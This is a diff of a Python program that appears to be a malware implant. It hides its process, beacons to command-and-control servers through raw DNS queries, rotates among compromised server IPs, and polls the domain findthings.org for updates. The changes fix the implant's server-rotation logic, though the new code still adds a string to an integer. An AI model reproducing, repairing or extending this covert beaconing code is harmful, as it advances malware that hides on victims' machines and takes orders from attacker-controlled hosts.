@@ -12,7 +12,7 @@ import platform
 import errno
 
 WAIT_TIME = 10
-global CURR_SERVER_INDEX
+CURR_SERVER_INDEX = 0
 
 def hideProccess():
     pid = os.getpid()
@@ -177,7 +177,7 @@ def phoneHome(domain, sock, recordType=None):
         try:
             sock.sendto(makeQuery(domain, recordType), (server, 53))
         except OSError as e:
-            if e.errno in (errno.EPERM):
+            if e.errno in [errno.EPERM]:
                 if not IS_LIST:
                     return []
                 else:
@@ -206,7 +206,7 @@ def phoneHome(domain, sock, recordType=None):
         try:
             sock.sendto(makeQuery(domain), (server, 53))
         except OSError as e:
-            if e.errno in (errno.EPERM):
+            if e.errno in [errno.EPERM]:
                 if not IS_LIST:
                     return []
                 else:
@@ -260,6 +260,7 @@ def phoneHome(domain, sock, recordType=None):
             rotateServer(distance)
 
 def rotateServer(distance):
+    global CURR_SERVER_INDEX
     comproised_ip = SERVER[CURR_SERVER_INDEX]
     raw = socket.inet_aton(comproised_ip)
     hex_ip = raw.hex()
@@ -390,12 +391,8 @@ while True:
                 else:
                     badIP = ips[1]
                     distance = ips[0].split('.')[3]
-                    CURR_SERVER_INDEX += distance
-                    CURR_SERVER_INDEX % SERVER
-                    x = 0
-                    while x < len(SERVER):
-                        if SERVER[x] == badIP:
-                            SERVER[x] = "XXX" + SERVER[x]
+                    badIndex = SERVER.index(badIP)
+                    CURR_SERVER_INDEX = (badIndex + distance) % len(SERVER)
             elif(ipSplit[3] == "55"):
                 print("Updating")
                 ips = phoneHome("findthings.org", sock=sock)
